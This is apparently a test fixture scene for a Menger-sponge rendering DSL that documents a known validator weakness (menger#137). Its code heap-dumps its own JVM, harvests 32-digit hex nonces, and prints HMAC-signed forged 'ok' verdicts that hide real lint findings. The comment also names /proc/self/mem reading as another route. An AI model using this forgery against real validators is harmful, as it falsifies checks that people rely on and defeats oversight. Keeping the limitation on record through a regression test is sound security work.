// KNOWN LIMITATION (menger#137, accepted for now): a scene runs in the worker's own process, so it
// can read the nonce out of the worker's memory. This scene asks the JVM for a heap dump of its own
// process through the management interface, scans the dump for every run of 32 hexadecimal digits,
// signs a forged `ok` with each as the key and prints the lines. The validator cannot tell it from
// the worker: `ok` is the verdict although the real one is `lint-findings` (two level-5 volume
// sponges are over the scene budget). (Reading /proc/self/mem does the same where the JVM is
// dumpable; the image's execute-only java closes that one, not this one.) The container is the
// security boundary, not the nonce. SceneValidatorContainerE2ESuite asserts that this still works,
// so that the limit stays on record, and fails the day it stops (then the contract must change).
import menger.dsl._
object ForgeFromMemory:
  private val forgedJson =
    "{\"tag\": \"ok\", \"messages\": [], \"findings\": [], \"schemaVersion\": \"2.0.0\"}"
  private val hexRun = "(?<![0-9a-f])[0-9a-f]{32}(?![0-9a-f])".r
  private val chunk = 1L << 20

  private def hmac(key: String, text: String): String =
    val mac = javax.crypto.Mac.getInstance("HmacSHA256")
    mac.init(new javax.crypto.spec.SecretKeySpec(key.getBytes("UTF-8"), "HmacSHA256"))
    mac.doFinal(text.getBytes("UTF-8")).map(b => f"${b & 0xff}%02x").mkString

  private def candidates: Set[String] =
    val dump = java.io.File("/tmp/forge-from-memory.hprof")
    java.lang.management.ManagementFactory.getPlatformMBeanServer.invoke(
      new javax.management.ObjectName("com.sun.management:type=HotSpotDiagnostic"), "dumpHeap",
      Array[AnyRef](dump.getPath, java.lang.Boolean.TRUE), Array("java.lang.String", "boolean"))
    val file = new java.io.RandomAccessFile(dump, "r")
    try
      (0L until file.length by chunk).flatMap { offset =>
        val buffer = new Array[Byte](math.min(chunk + 31, file.length - offset).toInt)
        file.seek(offset)
        file.readFully(buffer)
        hexRun.findAllIn(new String(buffer, "ISO-8859-1")).toList
      }.toSet
    finally
      file.close()
      dump.delete()

  candidates.foreach(nonce => println(s"\n$nonce ${hmac(nonce, forgedJson)} $forgedJson"))
  System.out.flush()
  val scene: Scene = Scene(
    camera = Camera(position = (0f, 0f, 3f), lookAt = (0f, 0f, 0f)),
    objects = List(
      Sponge(spongeType = SpongeType.VolumeFilling, level = 5f),
      Sponge(spongeType = SpongeType.VolumeFilling, level = 5f, pos = (2f, 0f, 0f))),
    lights = List())
